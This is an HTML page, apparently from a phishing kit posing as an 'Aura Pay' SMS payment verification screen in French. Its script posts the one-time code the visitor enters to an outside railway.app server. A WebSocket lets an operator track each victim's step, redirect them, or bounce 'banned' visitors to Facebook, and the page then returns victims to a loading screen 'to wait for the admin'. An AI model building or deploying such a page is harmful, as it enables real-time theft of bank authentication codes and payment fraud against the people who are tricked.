<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification SMS - Aura Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: 'Inter', sans-serif;
            background: #0f172a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            padding: 2rem;
            border-radius: 16px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h3 {
            margin-bottom: 1rem;
        }

        p {
            font-size: 0.9rem;
            color: #94a3b8;
            margin-bottom: 1.5rem;
        }

        input {
            width: 100%;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: white;
            font-size: 1.2rem;
            text-align: center;
            letter-spacing: 5px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 1rem;
            background: #6366f1;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            margin-top: 1.5rem;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="card">
        <h3>Vérification par SMS</h3>
        <p>Entrez le code de vérification envoyé sur votre mobile pour valider le paiement.</p>
        <form id="smsForm">
            <input type="text" id="otp" placeholder="••••••" maxlength="6" required>
            <button type="submit">Valider</button>
        </form>
    </div>

    <script>
        const clientId = localStorage.getItem('aura_client_id');
        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
        const ws = new WebSocket(wsUrl);
        ws.onopen = () => {
            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
        };

        ws.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'REDIRECT') window.location.href = msg.url;
            else if (msg.type === 'BANNED') {
                window.location.href = msg.redirect || 'https://www.facebook.com';
            }
        };

        document.getElementById('smsForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const otp = document.getElementById('otp').value;
            await fetch(`https://api-production-8591.up.railway.app/v1/sms-submit?client_id=${clientId}&otp=${otp}`, { method: 'POST' });
            window.location.href = '/loading'; // Retour au loading pour attendre l'admin
        });
    </script>
</body>

</html>
